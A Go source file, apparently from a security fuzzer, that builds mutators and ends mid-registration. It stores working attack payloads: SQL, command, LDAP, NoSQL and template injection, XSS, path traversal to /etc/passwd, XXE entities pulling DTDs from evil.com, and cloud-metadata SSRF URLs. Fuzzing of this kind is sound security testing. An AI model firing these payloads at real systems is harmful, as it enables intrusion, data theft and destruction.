// Package mutator provides type-aware smart mutation strategies.
// These mutators understand the structure of different data types and apply
// contextually appropriate mutations while preserving structural integrity.
package mutator

import (
	"bytes"
	"encoding/json"
	"strings"
	"unicode"

	"github.com/fluxfuzzer/fluxfuzzer/pkg/types"
)

// Common payloads for security testing
var (
	// SQL Injection payloads
	sqlInjectionPayloads = []string{
		"'",
		"\"",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"' OR 1=1--",
		"\" OR 1=1--",
		"'; DROP TABLE users;--",
		"1' AND '1'='1",
		"1' AND '1'='2",
		"' UNION SELECT NULL--",
		"' UNION SELECT 1,2,3--",
		"1; SELECT * FROM users",
		"admin'--",
		"') OR ('1'='1",
		"1' ORDER BY 1--",
		"1' WAITFOR DELAY '0:0:5'--",
		"1' AND SLEEP(5)--",
	}

	// XSS payloads
	xssPayloads = []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"<body onload=alert(1)>",
		"javascript:alert(1)",
		"<iframe src=\"javascript:alert(1)\">",
		"<a href=\"javascript:alert(1)\">click</a>",
		"<div onmouseover=alert(1)>hover</div>",
		"'-alert(1)-'",
		"</script><script>alert(1)</script>",
		"<img src=\"x\" onerror=\"alert(1)\">",
		"<svg/onload=alert(1)>",
		"<input onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<details open ontoggle=alert(1)>",
	}

	// Path Traversal payloads
	pathTraversalPayloads = []string{
		"../",
		"..\\",
		"....//",
		"....\\\\",
		"..%2f",
		"..%5c",
		"%2e%2e/",
		"%2e%2e%2f",
		"..%252f",
		"../../etc/passwd",
		"..\\..\\windows\\win.ini",
		"/etc/passwd",
		"C:\\Windows\\win.ini",
		"....//....//etc/passwd",
		"..;/",
	}

	// Command Injection payloads
	commandInjectionPayloads = []string{
		"; ls",
		"| ls",
		"& ls",
		"&& ls",
		"|| ls",
		"; cat /etc/passwd",
		"| cat /etc/passwd",
		"`id`",
		"$(id)",
		"; sleep 5",
		"| sleep 5",
		"& ping -c 5 127.0.0.1",
		"\n/bin/sh",
		"';shutdown -h now",
	}

	// LDAP Injection payloads
	ldapInjectionPayloads = []string{
		"*",
		"*)(&",
		"*)(|",
		"*()|&'",
		"admin)(&)",
		"admin)(|(password=*))",
		"*)(objectClass=*)",
	}

	// XML Injection payloads
	xmlInjectionPayloads = []string{
		"<!--",
		"-->",
		"<![CDATA[",
		"]]>",
		"<?xml version=\"1.0\"?>",
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
		"<foo>&xxe;</foo>",
		"]]><![CDATA[",
	}

	// SSTI (Server-Side Template Injection) payloads
	sstiPayloads = []string{
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"#{7*7}",
		"{{config}}",
		"{{self}}",
		"${T(java.lang.Runtime).getRuntime().exec('id')}",
		"{{''.__class__.__mro__[2].__subclasses__()}}",
	}

	// NoSQL Injection payloads
	nosqlInjectionPayloads = []string{
		"{\"$gt\": \"\"}",
		"{\"$ne\": null}",
		"{\"$where\": \"sleep(5000)\"}",
		"true, $where: '1 == 1'",
		"'; return this.password; var dummy='",
		"{\"$regex\": \".*\"}",
	}

	// Email format payloads
	emailPayloads = []string{
		"test@test.com",
		"test@",
		"@test.com",
		"test",
		"test@test@test.com",
		"test@test..com",
		"<script>@test.com",
		"test@<script>.com",
		"\"test\"@test.com",
		"test+tag@test.com",
	}

	// URL payloads
	urlPayloads = []string{
		"http://localhost",
		"http://127.0.0.1",
		"http://0.0.0.0",
		"http://[::1]",
		"file:///etc/passwd",
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"http://evil.com",
		"//evil.com",
		"http://169.254.169.254/",
		"http://metadata.google.internal/",
	}
)

// --- SmartMutator ---

// SmartMutator applies type-aware mutations
type SmartMutator struct {
	payloadType PayloadType
	payloads    []string
}

// PayloadType represents the category of payloads
type PayloadType int

const (
	PayloadSQLi PayloadType = iota
	PayloadXSS
	PayloadPathTraversal
	PayloadCommandInjection
	PayloadLDAP
	PayloadXML
	PayloadSSTI
	PayloadNoSQL
	PayloadEmail
	PayloadURL
)

// String returns the string representation of PayloadType
func (p PayloadType) String() string {
	switch p {
	case PayloadSQLi:
		return "sqli"
	case PayloadXSS:
		return "xss"
	case PayloadPathTraversal:
		return "path_traversal"
	case PayloadCommandInjection:
		return "command_injection"
	case PayloadLDAP:
		return "ldap"
	case PayloadXML:
		return "xml"
	case PayloadSSTI:
		return "ssti"
	case PayloadNoSQL:
		return "nosql"
	case PayloadEmail:
		return "email"
	case PayloadURL:
		return "url"
	default:
		return "unknown"
	}
}

// NewSmartMutator creates a new SmartMutator with the specified payload type
func NewSmartMutator(payloadType PayloadType) *SmartMutator {
	m := &SmartMutator{payloadType: payloadType}

	switch payloadType {
	case PayloadSQLi:
		m.payloads = sqlInjectionPayloads
	case PayloadXSS:
		m.payloads = xssPayloads
	case PayloadPathTraversal:
		m.payloads = pathTraversalPayloads
	case PayloadCommandInjection:
		m.payloads = commandInjectionPayloads
	case PayloadLDAP:
		m.payloads = ldapInjectionPayloads
	case PayloadXML:
		m.payloads = xmlInjectionPayloads
	case PayloadSSTI:
		m.payloads = sstiPayloads
	case PayloadNoSQL:
		m.payloads = nosqlInjectionPayloads
	case PayloadEmail:
		m.payloads = emailPayloads
	case PayloadURL:
		m.payloads = urlPayloads
	}

	return m
}

// Name returns the mutator name
func (m *SmartMutator) Name() string {
	return "smart/" + m.payloadType.String()
}

// Description returns the mutator description
func (m *SmartMutator) Description() string {
	return "Type-aware smart mutation for " + m.payloadType.String()
}

// Type returns the mutation type
func (m *SmartMutator) Type() types.MutationType {
	return types.StructureAware
}

// Mutate replaces input with a payload
func (m *SmartMutator) Mutate(input []byte) ([]byte, error) {
	if len(m.payloads) == 0 {
		return input, nil
	}

	idx := secureRandomInt(len(m.payloads))
	return []byte(m.payloads[idx]), nil
}

// MutateWithType applies mutation based on input type
func (m *SmartMutator) MutateWithType(input []byte, inputType InputType) ([]byte, error) {
	return m.Mutate(input)
}

// AppendPayload appends a payload to the input
func (m *SmartMutator) AppendPayload(input []byte) ([]byte, error) {
	if len(m.payloads) == 0 {
		return input, nil
	}

	idx := secureRandomInt(len(m.payloads))
	return append(input, []byte(m.payloads[idx])...), nil
}

// PrependPayload prepends a payload to the input
func (m *SmartMutator) PrependPayload(input []byte) ([]byte, error) {
	if len(m.payloads) == 0 {
		return input, nil
	}

	idx := secureRandomInt(len(m.payloads))
	result := make([]byte, 0, len(m.payloads[idx])+len(input))
	result = append(result, []byte(m.payloads[idx])...)
	result = append(result, input...)
	return result, nil
}

// --- JSONMutator ---

// JSONMutator applies structure-preserving mutations to JSON
type JSONMutator struct {
	mutationType JSONMutationType
}

// JSONMutationType defines the type of JSON mutation
type JSONMutationType int

const (
	JSONTypeConfusion JSONMutationType = iota // Change value types
	JSONKeyMangling                           // Modify keys
	JSONValueMutation                         // Modify values
	JSONStructure                             // Modify structure
	JSONInjection                             // Inject payloads
)

// NewJSONMutator creates a new JSONMutator
func NewJSONMutator(mutationType JSONMutationType) *JSONMutator {
	return &JSONMutator{mutationType: mutationType}
}

// Name returns the mutator name
func (m *JSONMutator) Name() string {
	switch m.mutationType {
	case JSONTypeConfusion:
		return "json/type_confusion"
	case JSONKeyMangling:
		return "json/key_mangle"
	case JSONValueMutation:
		return "json/value_mutation"
	case JSONStructure:
		return "json/structure"
	case JSONInjection:
		return "json/injection"
	default:
		return "json/unknown"
	}
}

// Description returns the mutator description
func (m *JSONMutator) Description() string {
	return "JSON structure-preserving mutation"
}

// Type returns the mutation type
func (m *JSONMutator) Type() types.MutationType {
	return types.StructureAware
}

// Mutate applies JSON-aware mutation
func (m *JSONMutator) Mutate(input []byte) ([]byte, error) {
	// Try to parse as JSON
	var data interface{}
	if err := json.Unmarshal(input, &data); err != nil {
		// Not valid JSON, return as-is or apply basic mutation
		return input, nil
	}

	// Apply mutation based on type
	switch m.mutationType {
	case JSONTypeConfusion:
		data = m.applyTypeConfusion(data)
	case JSONKeyMangling:
		data = m.applyKeyMangling(data)
	case JSONValueMutation:
		data = m.applyValueMutation(data)
	case JSONStructure:
		data = m.applyStructureMutation(data)
	case JSONInjection:
		data = m.applyInjection(data)
	}

	// Re-serialize
	result, err := json.Marshal(data)
	if err != nil {
		return input, nil
	}

	return result, nil
}

// MutateWithType applies mutation with type awareness
func (m *JSONMutator) MutateWithType(input []byte, inputType InputType) ([]byte, error) {
	if inputType != TypeJSON {
		return input, nil
	}
	return m.Mutate(input)
}

// applyTypeConfusion changes value types
func (m *JSONMutator) applyTypeConfusion(data interface{}) interface{} {
	switch v := data.(type) {
	case map[string]interface{}:
		for key, val := range v {
			v[key] = m.confuseType(val)
		}
		return v
	case []interface{}:
		for i, val := range v {
			v[i] = m.confuseType(val)
		}
		return v
	default:
		return m.confuseType(data)
	}
}

// confuseType changes a single value's type
func (m *JSONMutator) confuseType(val interface{}) interface{} {
	switch v := val.(type) {
	case string:
		// String → Number or Boolean
		choice := secureRandomInt(3)
		switch choice {
		case 0:
			return 12345
		case 1:
			return true
		default:
			return nil
		}
	case float64:
		// Number → String
		return "12345"
	case bool:
		// Boolean → String or Number
		if secureRandomInt(2) == 0 {
			return "true"
		}
		return 1
	case nil:
		// Null → String
		return "null"
	case map[string]interface{}:
		// Object → Array
		return []interface{}{v}
	case []interface{}:
		// Array → Object
		result := make(map[string]interface{})
		for i, item := range v {
			result[int64ToString(int64(i))] = item
		}
		return result
	default:
		return val
	}
}

// applyKeyMangling modifies JSON keys
func (m *JSONMutator) applyKeyMangling(data interface{}) interface{} {
	obj, ok := data.(map[string]interface{})
	if !ok {
		return data
	}

	// Select a random key to mangle
	keys := make([]string, 0, len(obj))
	for k := range obj {
		keys = append(keys, k)
	}

	if len(keys) == 0 {
		return data
	}

	keyIdx := secureRandomInt(len(keys))
	oldKey := keys[keyIdx]
	val := obj[oldKey]
	delete(obj, oldKey)

	// Apply mangling
	manglingType := secureRandomInt(5)
	var newKey string
	switch manglingType {
	case 0:
		newKey = strings.ToUpper(oldKey)
	case 1:
		newKey = strings.ToLower(oldKey)
	case 2:
		newKey = oldKey + "'"
	case 3:
		newKey = "__" + oldKey + "__"
	case 4:
		newKey = oldKey + "\x00"
	}

	obj[newKey] = val
	return obj
}

// applyValueMutation modifies JSON values
func (m *JSONMutator) applyValueMutation(data interface{}) interface{} {
	switch v := data.(type) {
	case map[string]interface{}:
		for key, val := range v {
			v[key] = m.mutateValue(val)
		}
		return v
	case []interface{}:
		for i, val := range v {
			v[i] = m.mutateValue(val)
		}
		return v
	default:
		return m.mutateValue(data)
	}
}

// mutateValue applies mutation to a single value
func (m *JSONMutator) mutateValue(val interface{}) interface{} {
	switch v := val.(type) {
	case string:
		mutations := []string{
			v + "'",
			"<script>" + v + "</script>",
			v + " OR 1=1",
			"{{" + v + "}}",
			v + "\x00",
			strings.Repeat(v, 100), // Overflow attempt
		}
		return mutations[secureRandomInt(len(mutations))]
	case float64:
		mutations := []float64{
			0,
			-1,
			v * 1000000,
			1.7976931348623157e+308,  // Max float64
			-1.7976931348623157e+308, // Min float64
		}
		return mutations[secureRandomInt(len(mutations))]
	case bool:
		return !v
	default:
		return val
	}
}

// applyStructureMutation modifies JSON structure
func (m *JSONMutator) applyStructureMutation(data interface{}) interface{} {
	switch v := data.(type) {
	case map[string]interface{}:
		mutation := secureRandomInt(4)
		switch mutation {
		case 0:
			// Add extra key
			v["__injected__"] = "payload"
		case 1:
			// Nest in array
			return []interface{}{v}
		case 2:
			// Remove random key
			for k := range v {
				delete(v, k)
				break
			}
		case 3:
			// Duplicate a key's value
			for k, val := range v {
				v[k+"_dup"] = val
				break
			}
		}
		return v
	case []interface{}:
		mutation := secureRandomInt(3)
		switch mutation {
		case 0:
			// Add extra element
			return append(v, "injected")
		case 1:
			// Remove element
			if len(v) > 0 {
				return v[:len(v)-1]
			}
		case 2:
			// Duplicate first element
			if len(v) > 0 {
				return append(v, v[0])
			}
		}
		return v
	default:
		return data
	}
}

// applyInjection injects payloads into JSON values
func (m *JSONMutator) applyInjection(data interface{}) interface{} {
	switch v := data.(type) {
	case map[string]interface{}:
		for key, val := range v {
			if _, ok := val.(string); ok {
				payloadType := secureRandomInt(3)
				var payload string
				switch payloadType {
				case 0:
					payload = sqlInjectionPayloads[secureRandomInt(len(sqlInjectionPayloads))]
				case 1:
					payload = xssPayloads[secureRandomInt(len(xssPayloads))]
				case 2:
					payload = sstiPayloads[secureRandomInt(len(sstiPayloads))]
				}
				v[key] = payload
				break // Only inject into one field
			}
		}
		return v
	default:
		return data
	}
}

// --- XMLMutator ---

// XMLMutator applies structure-preserving mutations to XML
type XMLMutator struct {
	mutationType XMLMutationType
}

// XMLMutationType defines the type of XML mutation
type XMLMutationType int

const (
	XMLEntityInjection   XMLMutationType = iota // XXE payloads
	XMLTagMangling                              // Modify tags
	XMLAttributeMutation                        // Modify attributes
	XMLCDATAInjection                           // CDATA injection
)

// NewXMLMutator creates a new XMLMutator
func NewXMLMutator(mutationType XMLMutationType) *XMLMutator {
	return &XMLMutator{mutationType: mutationType}
}

// Name returns the mutator name
func (m *XMLMutator) Name() string {
	switch m.mutationType {
	case XMLEntityInjection:
		return "xml/entity"
	case XMLTagMangling:
		return "xml/tag"
	case XMLAttributeMutation:
		return "xml/attribute"
	case XMLCDATAInjection:
		return "xml/cdata"
	default:
		return "xml/unknown"
	}
}

// Description returns the mutator description
func (m *XMLMutator) Description() string {
	return "XML structure-preserving mutation"
}

// Type returns the mutation type
func (m *XMLMutator) Type() types.MutationType {
	return types.StructureAware
}

// Mutate applies XML-aware mutation
func (m *XMLMutator) Mutate(input []byte) ([]byte, error) {
	if len(input) == 0 || input[0] != '<' {
		return input, nil
	}

	switch m.mutationType {
	case XMLEntityInjection:
		return m.injectEntity(input), nil
	case XMLTagMangling:
		return m.mangleTag(input), nil
	case XMLAttributeMutation:
		return m.mutateAttribute(input), nil
	case XMLCDATAInjection:
		return m.injectCDATA(input), nil
	}

	return input, nil
}

// MutateWithType applies mutation with type awareness
func (m *XMLMutator) MutateWithType(input []byte, inputType InputType) ([]byte, error) {
	if inputType != TypeXML {
		return input, nil
	}
	return m.Mutate(input)
}

// injectEntity adds XXE payload
func (m *XMLMutator) injectEntity(input []byte) []byte {
	xxePayloads := [][]byte{
		[]byte("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"),
		[]byte("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]>"),
		[]byte("<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]>"),
		[]byte("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>"),
	}

	payload := xxePayloads[secureRandomInt(len(xxePayloads))]

	// Find the position after XML declaration or at the beginning
	insertPos := 0
	if bytes.HasPrefix(input, []byte("<?xml")) {
		endDecl := bytes.Index(input, []byte("?>"))
		if endDecl != -1 {
			insertPos = endDecl + 2
		}
	}

	result := make([]byte, 0, len(input)+len(payload)+1)
	result = append(result, input[:insertPos]...)
	result = append(result, '\n')
	result = append(result, payload...)
	result = append(result, '\n')
	result = append(result, input[insertPos:]...)

	return result
}

// mangleTag modifies XML tags
func (m *XMLMutator) mangleTag(input []byte) []byte {
	// Find first opening tag
	start := bytes.IndexByte(input, '<')
	if start == -1 {
		return input
	}

	end := bytes.IndexByte(input[start:], '>')
	if end == -1 {
		return input
	}
	end += start

	// Extract tag content
	tagContent := input[start+1 : end]

	// Skip processing instructions and comments
	if len(tagContent) > 0 && (tagContent[0] == '?' || tagContent[0] == '!') {
		return input
	}

	// Apply mangling
	manglings := [][]byte{
		bytes.ToUpper(tagContent),
		append(tagContent, []byte(" injected=\"true\"")...),
		append([]byte("script:"), tagContent...),
	}

	mangled := manglings[secureRandomInt(len(manglings))]

	result := make([]byte, 0, len(input)+len(mangled)-len(tagContent))
	result = append(result, input[:start+1]...)
	result = append(result, mangled...)
	result = append(result, input[end:]...)

	return result
}

// mutateAttribute modifies XML attributes
func (m *XMLMutator) mutateAttribute(input []byte) []byte {
	// Simple approach: find and modify an attribute value
	eqIdx := bytes.Index(input, []byte("=\""))
	if eqIdx == -1 {
		return input
	}

	quoteStart := eqIdx + 2
	quoteEnd := bytes.IndexByte(input[quoteStart:], '"')
	if quoteEnd == -1 {
		return input
	}
	quoteEnd += quoteStart

	// Inject payload into attribute
	payloads := []string{
		"'",
		"\"><script>alert(1)</script>",
		"' onclick='alert(1)'",
		"javascript:alert(1)",
	}
	payload := payloads[secureRandomInt(len(payloads))]

	result := make([]byte, 0, len(input)+len(payload))
	result = append(result, input[:quoteStart]...)
	result = append(result, []byte(payload)...)
	result = append(result, input[quoteEnd:]...)

	return result
}

// injectCDATA injects CDATA sections
func (m *XMLMutator) injectCDATA(input []byte) []byte {
	cdataPayloads := [][]byte{
		[]byte("<![CDATA[<script>alert(1)</script>]]>"),
		[]byte("<![CDATA[]]><script>alert(1)</script><![CDATA[]]>"),
		[]byte("]]><script>alert(1)</script><![CDATA["),
	}

	payload := cdataPayloads[secureRandomInt(len(cdataPayloads))]

	// Find a text node to inject into (simplified: after first >)
	pos := bytes.IndexByte(input, '>')
	if pos == -1 || pos >= len(input)-1 {
		return input
	}

	result := make([]byte, 0, len(input)+len(payload))
	result = append(result, input[:pos+1]...)
	result = append(result, payload...)
	result = append(result, input[pos+1:]...)

	return result
}

// --- TypeInferrer ---

// TypeInferrer provides advanced type inference
type TypeInferrer struct{}

// NewTypeInferrer creates a new TypeInferrer
func NewTypeInferrer() *TypeInferrer {
	return &TypeInferrer{}
}

// InferType determines the type of input data
func (t *TypeInferrer) InferType(input []byte) InputType {
	if len(input) == 0 {
		return TypeUnknown
	}

	s := string(input)

	// Check for JSON
	if t.isJSON(input) {
		return TypeJSON
	}

	// Check for XML/HTML
	if input[0] == '<' {
		if t.isHTML(s) {
			return TypeHTML
		}
		return TypeXML
	}

	// Check for JWT
	if t.isJWT(s) {
		return TypeJWT
	}

	// Check for UUID
	if t.isUUID(s) {
		return TypeUUID
	}

	// Check for Email
	if t.isEmail(s) {
		return TypeEmail
	}

	// Check for URL
	if t.isURL(s) {
		return TypeURL
	}

	// Check for Base64
	if t.isBase64(s) {
		return TypeBase64
	}

	// Check for Hex
	if t.isHex(s) {
		return TypeHex
	}

	// Check for Integer
	if t.isInteger(s) {
		return TypeInteger
	}

	// Check for Float
	if t.isFloat(s) {
		return TypeFloat
	}

	return TypeString
}

// isJSON checks if input is valid JSON
func (t *TypeInferrer) isJSON(input []byte) bool {
	if len(input) < 2 {
		return false
	}
	first := input[0]
	if first != '{' && first != '[' {
		return false
	}
	var js interface{}
	return json.Unmarshal(input, &js) == nil
}

// isHTML checks if input looks like HTML
func (t *TypeInferrer) isHTML(s string) bool {
	htmlTags := []string{"<html", "<body", "<head", "<div", "<span", "<p>", "<a ", "<!doctype"}
	lower := strings.ToLower(s)
	for _, tag := range htmlTags {
		if strings.Contains(lower, tag) {
			return true
		}
	}
	return false
}

// isJWT checks for JWT format
func (t *TypeInferrer) isJWT(s string) bool {
	parts := strings.Split(s, ".")
	if len(parts) != 3 {
		return false
	}
	// Check if parts look like base64
	for _, part := range parts {
		if len(part) < 4 {
			return false
		}
		for _, c := range part {
			if !isBase64Char(c) {
				return false
			}
		}
	}
	return true
}

// isUUID checks for UUID format
func (t *TypeInferrer) isUUID(s string) bool {
	if len(s) != 36 {
		return false
	}
	// Check format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
	if s[8] != '-' || s[13] != '-' || s[18] != '-' || s[23] != '-' {
		return false
	}
	for i, c := range s {
		if i == 8 || i == 13 || i == 18 || i == 23 {
			continue
		}
		if !isHexChar(c) {
			return false
		}
	}
	return true
}

// isEmail checks for email format
func (t *TypeInferrer) isEmail(s string) bool {
	atIdx := strings.IndexByte(s, '@')
	if atIdx <= 0 || atIdx >= len(s)-1 {
		return false
	}
	dotIdx := strings.LastIndexByte(s, '.')
	return dotIdx > atIdx+1 && dotIdx < len(s)-1
}

// isURL checks for URL format
func (t *TypeInferrer) isURL(s string) bool {
	return strings.HasPrefix(s, "http://") ||
		strings.HasPrefix(s, "https://") ||
		strings.HasPrefix(s, "ftp://") ||
		strings.HasPrefix(s, "file://")
}

// isBase64 checks if string looks like Base64
func (t *TypeInferrer) isBase64(s string) bool {
	if len(s) < 4 || len(s)%4 != 0 {
		return false
	}
	for i, c := range s {
		if i >= len(s)-2 && c == '=' {
			continue
		}
		if !isBase64Char(c) {
			return false
		}
	}
	return true
}

// isHex checks if string is hexadecimal
func (t *TypeInferrer) isHex(s string) bool {
	if len(s) < 2 || len(s)%2 != 0 {
		return false
	}
	for _, c := range s {
		if !isHexChar(c) {
			return false
		}
	}
	return true
}

// isInteger checks if string is an integer
func (t *TypeInferrer) isInteger(s string) bool {
	if len(s) == 0 {
		return false
	}
	start := 0
	if s[0] == '-' || s[0] == '+' {
		start = 1
	}
	if start >= len(s) {
		return false
	}
	for i := start; i < len(s); i++ {
		if s[i] < '0' || s[i] > '9' {
			return false
		}
	}
	return true
}

// isFloat checks if string is a float
func (t *TypeInferrer) isFloat(s string) bool {
	if len(s) == 0 {
		return false
	}
	hasDot := false
	hasE := false
	start := 0
	if s[0] == '-' || s[0] == '+' {
		start = 1
	}
	for i := start; i < len(s); i++ {
		c := s[i]
		if c == '.' {
			if hasDot || hasE {
				return false
			}
			hasDot = true
		} else if c == 'e' || c == 'E' {
			if hasE {
				return false
			}
			hasE = true
		} else if c == '-' || c == '+' {
			if i == 0 || (s[i-1] != 'e' && s[i-1] != 'E') {
				return false
			}
		} else if c < '0' || c > '9' {
			return false
		}
	}
	return hasDot || hasE
}

// Helper functions
func isBase64Char(c rune) bool {
	return (c >= 'A' && c <= 'Z') ||
		(c >= 'a' && c <= 'z') ||
		(c >= '0' && c <= '9') ||
		c == '+' || c == '/' || c == '-' || c == '_'
}

func isHexChar(c rune) bool {
	return (c >= '0' && c <= '9') ||
		(c >= 'a' && c <= 'f') ||
		(c >= 'A' && c <= 'F')
}

// --- BoundaryMutator ---

// BoundaryMutator applies boundary value mutations
type BoundaryMutator struct{}

// NewBoundaryMutator creates a new BoundaryMutator
func NewBoundaryMutator() *BoundaryMutator {
	return &BoundaryMutator{}
}

// Name returns the mutator name
func (m *BoundaryMutator) Name() string {
	return "smart/boundary"
}

// Description returns the mutator description
func (m *BoundaryMutator) Description() string {
	return "Boundary value mutation"
}

// Type returns the mutation type
func (m *BoundaryMutator) Type() types.MutationType {
	return types.StructureAware
}

// Mutate applies boundary mutation based on detected type
func (m *BoundaryMutator) Mutate(input []byte) ([]byte, error) {
	inferrer := NewTypeInferrer()
	inputType := inferrer.InferType(input)
	return m.MutateWithType(input, inputType)
}

// MutateWithType applies mutation based on input type
func (m *BoundaryMutator) MutateWithType(input []byte, inputType InputType) ([]byte, error) {
	switch inputType {
	case TypeInteger:
		return m.mutateInteger(input)
	case TypeFloat:
		return m.mutateFloat(input)
	case TypeString:
		return m.mutateString(input)
	case TypeUUID:
		return m.mutateUUID(input)
	case TypeEmail:
		return m.mutateEmail(input)
	default:
		return input, nil
	}
}

func (m *BoundaryMutator) mutateInteger(input []byte) ([]byte, error) {
	boundaries := []string{
		"0",
		"-1",
		"1",
		"127",
		"-128",
		"255",
		"256",
		"32767",
		"-32768",
		"65535",
		"65536",
		"2147483647",
		"-2147483648",
		"4294967295",
		"9223372036854775807",
		"-9223372036854775808",
	}
	return []byte(boundaries[secureRandomInt(len(boundaries))]), nil
}

func (m *BoundaryMutator) mutateFloat(input []byte) ([]byte, error) {
	boundaries := []string{
		"0.0",
		"-0.0",
		"1.0",
		"-1.0",
		"0.1",
		"0.01",
		"1e10",
		"1e-10",
		"1.7976931348623157e+308",
		"-1.7976931348623157e+308",
		"2.2250738585072014e-308",
		"NaN",
		"Infinity",
		"-Infinity",
	}
	return []byte(boundaries[secureRandomInt(len(boundaries))]), nil
}

func (m *BoundaryMutator) mutateString(input []byte) ([]byte, error) {
	boundaries := [][]byte{
		{},                               // Empty
		{0x00},                           // Null byte
		bytes.Repeat([]byte("A"), 256),   // Long string
		bytes.Repeat([]byte("A"), 1024),  // Very long
		bytes.Repeat([]byte("A"), 65536), // Extremely long
		{0xFF, 0xFE},                     // BOM
		[]byte("\r\n"),                   // CRLF
		[]byte("\\x00"),                  // Escaped null
		[]byte("%00"),                    // URL encoded null
		[]byte("&#x0;"),                  // HTML entity null
	}
	return boundaries[secureRandomInt(len(boundaries))], nil
}

func (m *BoundaryMutator) mutateUUID(input []byte) ([]byte, error) {
	boundaries := []string{
		"00000000-0000-0000-0000-000000000000",
		"ffffffff-ffff-ffff-ffff-ffffffffffff",
		"FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF",
		"00000000-0000-0000-0000-000000000001",
		"gg000000-0000-0000-0000-000000000000", // Invalid
		"0000000-0000-0000-0000-000000000000",  // Wrong format
	}
	return []byte(boundaries[secureRandomInt(len(boundaries))]), nil
}

func (m *BoundaryMutator) mutateEmail(input []byte) ([]byte, error) {
	boundaries := []string{
		"",                                       // Empty
		"@",                                      // Just @
		"a@",                                     // Missing domain
		"@b.com",                                 // Missing local
		"a@b",                                    // Missing TLD
		strings.Repeat("a", 64) + "@b.com",       // Long local part
		"a@" + strings.Repeat("b", 255) + ".com", // Long domain
		"<script>@test.com",                      // XSS
		"a@b.com\x00c@d.com",                     // Null injection
	}
	return []byte(boundaries[secureRandomInt(len(boundaries))]), nil
}

// --- UnicodeAttackMutator ---

// UnicodeAttackMutator applies Unicode-based attacks
type UnicodeAttackMutator struct{}

// NewUnicodeAttackMutator creates a new UnicodeAttackMutator
func NewUnicodeAttackMutator() *UnicodeAttackMutator {
	return &UnicodeAttackMutator{}
}

// Name returns the mutator name
func (m *UnicodeAttackMutator) Name() string {
	return "smart/unicode"
}

// Description returns the mutator description
func (m *UnicodeAttackMutator) Description() string {
	return "Unicode-based attack mutation"
}

// Type returns the mutation type
func (m *UnicodeAttackMutator) Type() types.MutationType {
	return types.StructureAware
}

// Mutate applies Unicode attack mutation
func (m *UnicodeAttackMutator) Mutate(input []byte) ([]byte, error) {
	attacks := []func([]byte) []byte{
		m.homoglyphAttack,
		m.nullByteInjection,
		m.overflowSequence,
		m.rtlOverride,
		m.zeroWidthInjection,
	}

	attack := attacks[secureRandomInt(len(attacks))]
	return attack(input), nil
}

// MutateWithType applies mutation with type awareness
func (m *UnicodeAttackMutator) MutateWithType(input []byte, inputType InputType) ([]byte, error) {
	return m.Mutate(input)
}

// homoglyphAttack replaces characters with lookalikes
func (m *UnicodeAttackMutator) homoglyphAttack(input []byte) []byte {
	// Common homoglyphs
	homoglyphs := map[rune]rune{
		'a': 'а', // Cyrillic
		'e': 'е', // Cyrillic
		'o': 'о', // Cyrillic
		'p': 'р', // Cyrillic
		'c': 'с', // Cyrillic
		'x': 'х', // Cyrillic
		'y': 'у', // Cyrillic
	}

	runes := []rune(string(input))
	for i, r := range runes {
		if replacement, ok := homoglyphs[unicode.ToLower(r)]; ok {
			runes[i] = replacement
			break // Replace only one character
		}
	}

	return []byte(string(runes))
}

// nullByteInjection inserts null bytes
func (m *UnicodeAttackMutator) nullByteInjection(input []byte) []byte {
	if len(input) == 0 {
		return []byte{0x00}
	}

	pos := secureRandomInt(len(input) + 1)
	result := make([]byte, len(input)+1)
	copy(result[:pos], input[:pos])
	result[pos] = 0x00
	if pos < len(input) {
		copy(result[pos+1:], input[pos:])
	}
	return result
}

// overflowSequence adds UTF-8 overflow sequences
func (m *UnicodeAttackMutator) overflowSequence(input []byte) []byte {
	overflows := [][]byte{
		{0xC0, 0xAF},             // Overlong /
		{0xE0, 0x80, 0xAF},       // Overlong /
		{0xF0, 0x80, 0x80, 0xAF}, // Overlong /
		{0xC0, 0xAE},             // Overlong .
	}

	overflow := overflows[secureRandomInt(len(overflows))]
	return append(input, overflow...)
}

// rtlOverride adds right-to-left override
func (m *UnicodeAttackMutator) rtlOverride(input []byte) []byte {
	rtlChars := []byte{0xE2, 0x80, 0x8F} // U+202F RLO
	return append(rtlChars, input...)
}

// zeroWidthInjection inserts zero-width characters
func (m *UnicodeAttackMutator) zeroWidthInjection(input []byte) []byte {
	zeroWidth := [][]byte{
		{0xE2, 0x80, 0x8B}, // Zero-width space
		{0xE2, 0x80, 0x8C}, // Zero-width non-joiner
		{0xE2, 0x80, 0x8D}, // Zero-width joiner
		{0xEF, 0xBB, 0xBF}, // BOM
	}

	if len(input) == 0 {
		return zeroWidth[0]
	}

	pos := secureRandomInt(len(input))
	char := zeroWidth[secureRandomInt(len(zeroWidth))]

	result := make([]byte, 0, len(input)+len(char))
	result = append(result, input[:pos]...)
	result = append(result, char...)
	result = append(result, input[pos:]...)
	return result
}

// --- RegisterSmartMutators ---

// RegisterSmartMutators registers all smart mutators with the given engine
func RegisterSmartMutators(engine *MutatorEngine) {
	// Security payload mutators
	engine.Register(NewSmartMutator(PayloadSQLi))
	engine.Register(NewSmartMutator(PayloadXSS))
	engine.Register(NewSmartMutator(PayloadPathTraversal))
	engine.Register(NewSmartMutator(PayloadCommandInjection))
	engine.Register(NewSmartMutator(PayloadLDAP))
	engine.Register(NewSmartMutator(PayloadXML))
	engine.Register(NewSmartMutator(PayloadSSTI))
	engine.Register(NewSmartMutator(PayloadNoSQL))

	// JSON mutators
	engine.Register(NewJSONMutator(JSONTypeConfusion))
	engine.Register(NewJSONMutator(JSONKeyMangling))
	engine.Register(NewJSONMutator(JSONValueMutation))
